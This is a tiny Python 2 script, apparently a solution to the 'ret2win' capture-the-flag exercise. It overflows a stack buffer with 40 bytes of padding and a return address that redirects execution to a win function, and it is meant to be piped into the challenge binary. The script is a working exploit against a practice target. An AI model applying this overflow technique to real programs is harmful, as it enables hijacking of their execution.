import struct

ret2win_mov = struct.pack("Q", 0x0000000000400824)

pad = 'A'*40

payload = pad + ret2win_mov

print payload

#run : python ex.py | ./ret2win